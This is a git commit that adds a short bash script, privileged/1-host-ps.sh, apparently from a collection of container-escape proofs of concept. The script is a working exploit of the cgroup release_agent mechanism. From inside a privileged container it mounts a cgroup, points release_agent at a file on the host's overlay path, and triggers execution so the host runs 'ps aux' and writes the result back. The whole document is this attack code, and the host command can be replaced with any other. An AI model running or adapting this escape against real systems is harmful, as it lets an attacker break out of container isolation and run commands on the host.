0f8208c9dc5fdb864a95beabc7a2ac994c78ae43
neargle <nearg1e.com@gmail.com>
2020-05-13 20:37:14 +0800

    ps aux in host with privileged

---
+++ privileged/1-host-ps.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+
+set -ue
+
+mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+ 
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+ 
+echo '#!/bin/sh' > /cmd
+echo "ps aux > $host_path/output" >> /cmd
+chmod a+x /cmd
+ 
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
